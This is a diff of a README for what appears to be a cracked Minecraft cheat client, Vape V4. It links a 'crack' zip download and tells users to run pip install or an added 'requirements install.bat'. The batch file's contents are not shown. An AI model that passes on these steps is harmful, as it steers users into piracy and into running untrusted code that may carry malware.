@@ -10,7 +10,7 @@ Ghost Client Minecraft
 
 2.install the crack : [Download](https://github.com/ByteSleuths/Vape-V4/archive/refs/heads/main.zip) 
 
-3.Open a Cmd in the folder and put the command : pip install -r requirements.txt
+3.Open a Cmd in the folder and put the command : pip install -r requirements.txt or launch requirements install.bat
 
 4.Proceed to install [Java 17.0.6](https://www.oracle.com/java/technologies/javase/jdk17-archive-downloads.html) or a more recent version.
 
